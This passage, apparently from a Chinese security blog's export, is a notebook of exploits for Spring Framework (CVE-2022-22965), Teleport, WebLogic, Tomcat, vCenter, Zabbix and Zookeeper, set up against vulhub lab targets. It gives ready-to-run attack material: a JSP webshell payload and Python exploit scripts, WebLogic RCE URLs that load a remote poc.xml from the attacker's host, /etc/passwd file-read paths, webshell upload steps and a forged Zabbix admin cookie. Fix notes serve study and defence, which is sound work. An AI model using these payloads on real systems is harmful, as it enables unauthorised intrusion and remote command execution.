<li><p>Postman配置下游Burp代理，再Send发送测试Burp是否能正确接收到请求。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110804658.png" alt="image-20230416110804658"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110829114.png" alt="image-20230416110829114"></p>
</li>
<li><p>批量自动化测试，点击APIs第一行，再点击<code>Test and Automation</code>再点击Run,再点击Run，即可完成。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416111003596.png" alt="image-20230416111003596"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416111116627.png" alt="image-20230416111116627"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416111244628.png" alt="image-20230416111244628"></p>
</li>
<li><p>可以burp下游再配置xray…</p>
</li>
</ol>
<h1 id="CVE-2022-22965">4. CVE-2022-22965</h1><h2 id="漏洞原理：">4.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。CVE-2022-22965漏洞是CVE-2010-1622漏洞的绕过。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本：">4.2. 影响版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、JDK ≥ 9</span><br><span class="line">2、Spring Framework 版本为5.3.0 - 5.3.17，5.2.0 - 5.2.19或更旧的版本</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建：">4.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者: win11 192.168.179.1</span><br><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/spring/CVE-2022-22965</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br><span class="line">		访问靶机8080端口,出现下图页面即搭建成功</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/We8Mp6zS1o5f4Bd.png" alt="image-20220710091019975"></p>
<h2 id="漏洞复现：-3">4.4. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、使用 burp 进行抓包，发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件 // 注意若在同一机器上搭建靶场，靶场会占用8080端口，需更改burp代理端口</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将 Connection:close 后面部分替换成</span><br><span class="line">	suffix: %&gt;//</span><br><span class="line">	c1: Runtime</span><br><span class="line">	c2: &lt;%</span><br><span class="line">	DNT: 1</span><br><span class="line">	Content-Length: 2</span><br><span class="line">	</span><br><span class="line">再构造URL为下面代码:	// 记得前面加?</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br><span class="line"></span><br><span class="line">实际发送数据包如下图所示:		Content-Length: 2 发送成功后会变为 0</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/ymCs9FHuWlEbiPe.png" alt="image-20220710132339932"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、访问 /tomcatwar.jsp?pwd=j&amp;cmd=whoami // 命令执行成功</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/1lNAjbVvEMmd2fg.png" alt="image-20220710103149941"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL参数解析:</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern=xxx（写入shell内容）</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp（修改tomcat配置日志文件后缀jsp）</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT（写入shell在网站根目录）</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell（写入shell文件名称）class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=（文件日期格式,实际构造为空值即可）</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复">4.5. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将 Spring Framework 升级至安全版本</span><br><span class="line">2、JDK 版本退回到9以下</span><br></pre></td></tr></table></figure>

<h2 id="EXP">4.6. EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;suffix&quot;: &quot;%&gt;//&quot;,</span><br><span class="line">    &quot;c1&quot;: &quot;Runtime&quot;,</span><br><span class="line">    &quot;c2&quot;: &quot;&lt;%&quot;,</span><br><span class="line">    &quot;DNT&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">payload = &quot;?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    url_spli = f&#x27;&#123;url&#125;&#123;payload&#125;&#x27;</span><br><span class="line">    requests.get(url=url_spli, headers=headers)</span><br><span class="line">    shell = f&#x27;&#123;url&#125;/tomcatwar.jsp?pwd=j&amp;cmd=whoami&#x27;</span><br><span class="line">    resp = requests.get(url=shell, headers=headers)</span><br><span class="line">    if resp.status_code == 200:</span><br><span class="line">        print(f&quot;[+] Shell : &#123;shell&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Not Spring4shell&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
  </entry>
  <entry>
    <title>Teleport</title>
    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/TELEPORT.html</url>
    <content><![CDATA[<h3 id="Teleport开源堡垒机登录认证绕过">0.0.1. Teleport开源堡垒机登录认证绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先访问/auth/do-login，查看回显数据包或状态码是否为405</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220910120911318.png" alt="image-20220910120911318"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后去主页点击验证码刷新一下</span><br><span class="line">发送post请求，将captcha换成验证码，执行，返回&quot;code&quot;: 0即执行成功，回到主页刷新即登录成功</span><br><span class="line">args=&#123;&quot;type&quot;:2,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:null,&quot;captcha&quot;:&quot;xxxx&quot;,&quot;oath&quot;:&quot;&quot;,&quot;remember&quot;:false&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220910120959516.png" alt="image-20220910120959516"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220910121627867.png" alt="image-20220910121627867"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220910121709280.png" alt="image-20220910121709280"></p>
<p>exp</p>
<p><code>https://github.com/qiwentaidi/TELEPORT-EXP</code>使用详情，请看github</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver import Chrome</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">url = sys.argv[1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bypass():</span><br><span class="line">    web = Chrome()</span><br><span class="line">    web.get(url)</span><br><span class="line">    cookie = web.get_cookies()[0][&#x27;value&#x27;]</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&#x27;,</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">        &#x27;Cookie&#x27;: &#x27;_sid=&#x27; + cookie + &#x27;; username=admin&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    captcha = input(&quot;请输入当前验证码&quot;)</span><br><span class="line">    data = &#x27;args=&#123;&quot;type&quot;:2,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:null,&quot;captcha&quot;:&quot;&#x27; + captcha + &#x27;&quot;,&quot;oath&quot;:&quot;&quot;,&quot;remember&quot;:false&#125;&#x27;</span><br><span class="line">    resp_dict = requests.post(url=f&#x27;&#123;url&#125;auth/do-login&#x27;, headers=headers, data=data).json()</span><br><span class="line">    print(resp_dict)</span><br><span class="line">    if resp_dict[&#x27;code&#x27;] == 0:</span><br><span class="line">        print(f&#x27;[+]存在登录认证绕过漏洞，&#123;url&#125;auth/login&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[-]&#123;url&#125;不存在登录认证绕过漏洞&#x27;)</span><br><span class="line">    input(&quot;按任意键退出，窗口关闭！&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bypass()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="任意文件读取">0.0.2. 任意文件读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需登录后才能访问</span><br><span class="line">/audit/get-file?f=/etc/passwd&amp;rid=1&amp;type=rdp&amp;act=read&amp;amp;offset=0</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220910161530448.png" alt="image-20220910161530448"></p>
]]></content>
      <categories>
        <category>网络设备</category>
      </categories>
  </entry>
  <entry>
    <title>Weblogic</title>
    <url>/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/WebLogic.html</url>
    <content><![CDATA[<h1 id="Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）">1. Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle Weblogic Server 10.3.6.0.0</span><br><span class="line">Oracle Weblogic Server 12.1.3.0.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.3.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.4.0</span><br><span class="line">Oracle Weblogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者: win11 192.168.179.1</span><br><span class="line">靶机: ubuntu 192.168.179.134	-- 需要安装vulhub靶场</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/weblogic/CVE-2020-14882</span><br><span class="line">		sudo docker-compose up -d	// 启动环境</span><br><span class="line">		启动完成后访问http://you-ip/7001/console，出现下图页面即部署成功</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/4TyiLb9rtsdxKSB.png" alt="image-20220710160918820"></p>
<h2 id="漏洞复现">1.4. 漏洞复现:</h2><p><code>访问改目录 /console/css/%252e%252e%252fconsole.portal 可以跳过身份认证到管理后台</code></p>
<p><img src="https://s2.loli.net/2022/07/10/vBpAEs4jxFDPZRH.png" alt="image-20220710162250812"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此时需要利用到第二个漏洞 CVE-2020-14883。有两种利用方法:</span><br><span class="line">一是通过 com.tangosol.coherence.mvel2.sh.ShellSession 类	 // 只能在Weblogic 12.2.1以上版本利用</span><br><span class="line">二是通过 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext  // 全版本有效</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法一:</span><br><span class="line">http://192.168.179.134:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)	// 访问该页面会返回404，但是会在tmp目录下创建success1文件</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/IrHpFMNOht2ygCS.png" alt="image-20220710164521172"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法二:</span><br><span class="line">http://192.168.179.134:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://192.168.179.1:8000/poc.xml&quot;)	// 然后通过该URL，即可让Weblogic加载这个XML，并执行其中的命令</span><br><span class="line"></span><br><span class="line">把poc.xml文件放入python3目录下，输入 python3 -m http.server // 开启本地 web 服务,poc.xml 代码如下</span><br><span class="line">访问上面网址，查看服务器目录 success2 文件已创建成功</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/h9Kp4aUlkTXRN6d.png" alt="image-20220710171646759"></p>
<p><img src="https://s2.loli.net/2022/07/10/AvpbTgytMsarhdY.png" alt="image-20220710172411404"></p>
<h2 id="漏洞利用">1.5. 漏洞利用:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zhzyker/exphub.git	// 下载 exphub</span><br><span class="line">选择其中的 cve-2020-14882_rce.py</span><br><span class="line">python3 cve-2020-14882_rce.py -u target_url -c whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/XQykKLblxs41MUh.png" alt="image-20220710170342678"></p>
<h2 id="漏洞修复">1.6. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、及时下载官方补丁进行升级修复。下载地址如下：https://www.oracle.com/security-alerts/cpuoct2020.html。</span><br><span class="line">2、关闭后台/console/console.portal的访问权限。</span><br><span class="line">3、修改后台默认地址。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>GetShell</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat</title>
    <url>/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/Tomcat.html</url>
    <content><![CDATA[<h1 id="弱口令-war后门文件部署">1. 弱口令+war后门文件部署</h1><h2 id="影响版本：">1.1. 影响版本：</h2><p><code>全版本 Tomcat</code></p>
<h2 id="漏洞复现：">1.2. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、弱口令登录Tomcat后台</span><br><span class="line">2、找到war包部署点、上传war木马 // war木马可通过先将木马压缩成rar再改后缀名变成war的方式制作</span><br><span class="line">3、访问木马连接查看是否存在</span><br><span class="line">4、使用菜刀、冰蝎等webshell管理工具连接木马 // 需要访问压缩包里的木马文件</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/09/IhvsNlpVU9gkm7j.png" alt="image-20220809015111839"></p>
<p><img src="https://s2.loli.net/2022/08/09/zrVUSwE2JmvxAoH.png" alt="image-20220809015226353"></p>
<p><img src="https://s2.loli.net/2022/08/09/aU7FL1vMJQwjTYP.png" alt="image-20220809015306931"></p>
<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、修改tomcat弱口令，保证密码复杂度</span><br></pre></td></tr></table></figure>

<h1 id="任意文件写入（CVE-2017-12615）">2. 任意文件写入（CVE-2017-12615）</h1><h2 id="漏洞原理：">2.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于配置不当（非默认配置），将配置文件conf/web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，不过限制了jsp后缀的上传，但是可以通过/绕过上传限制获取服务器权限。</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/08/dFM7WJRa56bUE9A.png" alt="image-20220706140946401"></p>
<h2 id="影响版本：-1">2.2. 影响版本：</h2><p><code>Apache Tomcat 7.0.0-7.0.81</code></p>
<h2 id="环境搭建：">2.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130	// 需要安装vulhub环境</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">		sudo docker-compose up -d	// 启动环境</span><br><span class="line">		访问靶机8080端口，回显tomcat 8.5.19即完成部署</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现：-1">2.4. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、使用PUT方法，上传木马文件</span><br><span class="line">2、访问木马文件验证是否已存在</span><br><span class="line">3、使用冰蝎连接木马文件，密码rebeyond，成功获取服务器权限</span><br><span class="line"></span><br><span class="line">复现完成后sudo find / -name shell.jsp // 查找木马上传路径，并rm删除该文件</span><br><span class="line">sudo docker-compose down // 关闭环境</span><br></pre></td></tr></table></figure>

<p>More info : 这里如果只上传shell.jsp 会被拦截，需要加&#x2F;绕过文件上传限制，即shell.jsp&#x2F;</p>
<p><img src="https://s2.loli.net/2022/07/08/mFTpE5A1ZxfbXkS.png" alt="image-20220708100500738"></p>
<p><img src="https://s2.loli.net/2022/07/08/E38ZPfWNJUCltx2.png" alt="image-20220708101531577"></p>
<h2 id="漏洞修复：-1">2.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将 Tomcat 版本升级到7.0.81以上</span><br></pre></td></tr></table></figure>

<h1 id="文件包含（CVE-2020-1938）">3. 文件包含（CVE-2020-1938）</h1><h2 id="漏洞原理：-1">3.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本：-2">3.2. 影响版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Tomcat 9.x &lt; 9.0.31</span><br><span class="line">Apache Tomcat 8.x &lt; 8.5.51</span><br><span class="line">Apache Tomcat 7.x &lt; 7.0.100</span><br><span class="line">Apache Tomcat 6.x</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建：-1">3.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130	// 需要安装vulhub环境</span><br><span class="line">		</span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/tomcat/CVE-2020-1938</span><br><span class="line">		sudo docker-compose up -d	// 启动环境		</span><br><span class="line">		访问靶机8080端口，回显tomcat 9.5.30即完成部署</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现">3.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、nmap 扫描查看8009端口ajp服务是否开启 	// 未开启则不存在该漏洞</span><br><span class="line">2、使用exp读取文件web.xml文件 // 正常机器读取目录为 /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/08/cfAToDgFvrkpZtO.png" alt="image-20220708111439999"></p>
<p><img src="https://s2.loli.net/2022/07/08/ejI9m8xn7d3gkGL.png" alt="image-20220708133359252"></p>
<p><img src="https://s2.loli.net/2022/07/08/aYXmTzBOlJRbHou.png" alt="Ubuntu web.xml文件"></p>
<h2 id="漏洞修复：-2">3.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将 Tomcat 升级到不受影响的版本</span><br><span class="line">2、关闭AJP Connector</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>中间件</category>
      </categories>
  </entry>
  <entry>
    <title>vmware-vcenter</title>
    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Vmware-vcenter.html</url>
    <content><![CDATA[<h3 id="任意文件读取">0.0.1. 任意文件读取</h3><h4 id="windows">0.0.1.1. windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174608979.png" alt="image-20220916174608979"></p>
<h4 id="linux">0.0.1.2. linux</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/eam/vib?id=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174733158.png" alt="image-20220916174733158"></p>
<h3 id="任意文件上传CVE-2021-21972">0.0.2. 任意文件上传CVE-2021-21972</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ui/vropspluginui/rest/services/uploadova存在任意文件上传漏洞</span><br><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>

<h3 id="远程代码执行CVE-2021-21985">0.0.3. 远程代码执行CVE-2021-21985</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174450563.png" alt="image-20220916174450563"></p>
<h3 id="任意文件上传CVE-2021-22005">0.0.4. 任意文件上传CVE-2021-22005</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络设备</category>
      </categories>
  </entry>
  <entry>
    <title>Zabbix</title>
    <url>/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html</url>
    <content><![CDATA[<h1 id="zabbix认证绕过漏洞（CVE-2022-23131）">1. zabbix认证绕过漏洞（CVE-2022-23131）</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。</span><br></pre></td></tr></table></figure>

<p><code>fofa:app=&quot;ZABBIX-监控系统&quot; &amp;&amp; body=&quot;saml&quot;</code></p>
<p><img src="https://s2.loli.net/2022/07/25/RyFqEgfjbirVC4I.png" alt="image-20220725005801979"></p>
<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.0.36</span><br><span class="line"></span><br><span class="line">5.4.0</span><br><span class="line"></span><br><span class="line">5.4.8</span><br><span class="line"></span><br><span class="line">6.0.0alpha1</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><p><img src="https://s2.loli.net/2022/07/25/ad2ioMbjwvIV7Y8.png" alt="image-20220725005445702"></p>
<p>通过请求原始页面，获取zbx_session字段的值为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJzZXNzaW9uaWQiOiJlM2NlNDY4ZjE3NjMyZjBkNTgxZjdjZDEyNmJlNGM1YSIsInNpZ24iOiI4M2FkMTc1YjE1ZGNkNTJkMDI1NDljYjRiYzRkN2FmMGFjYTY5ZTIzNWYyODg3NjY5ZjdiMjA4OTRiN2RiNGFjIn0%3D</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/25/bDujAFrL7sd5lgE.png" alt="image-20220725020207605"></p>
<p>先进行URL解码（%3D为&#x3D;）再将值进行base64解码</p>
<p><img src="https://s2.loli.net/2022/07/25/MlZWt9Cjeun17Vs.png" alt="image-20220725011909395"></p>
<p>解码成功后构造payload，将解码后的参数值替换下方参数值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&quot;sessionid&quot;:&quot;4e468962568f645232585a9d73532bf1&quot;,&quot;sign&quot;:&quot;e5a421ca587c0539c9f83560ab9975496109ca2ac71f781eff47c656b165e2c8&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>再将上方值进行base64编码</p>
<p><img src="https://s2.loli.net/2022/07/25/vdrF6nDXYA39wCI.png" alt="image-20220725013812468"></p>
<p>构造payload，将Cookie字段替换成下列payload再发送数据包，即可登录成功（本文测试站点不存在该漏洞）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiNGU0Njg5NjI1NjhmNjQ1MjMyNTg1YTlkNzM1MzJiZjEiLCJzaWduIjoiZTVhNDIxY2E1ODdjMDUzOWM5ZjgzNTYwYWI5OTc1NDk2MTA5Y2EyYWM3MWY3ODFlZmY0N2M2NTZiMTY1ZTJjOCJ9</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/25/2thvQGZbRenSiCm.png" alt="image-20220725020834242"></p>
]]></content>
      <categories>
        <category>WEB应用</category>
      </categories>
  </entry>
  <entry>
    <title>Zookeeper</title>
    <url>/pages/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Zookeeper.html</url>
    <content><![CDATA[<h1 id="zookeeper未授权访问">1. zookeeper未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zookeeper 未授权访问是指安装部署之后默认情况下不需要任何身份验证，从而导致 zookeeper 被远程利用，导致大量服务级别的信息泄露。</span><br></pre></td></tr></table></figure>

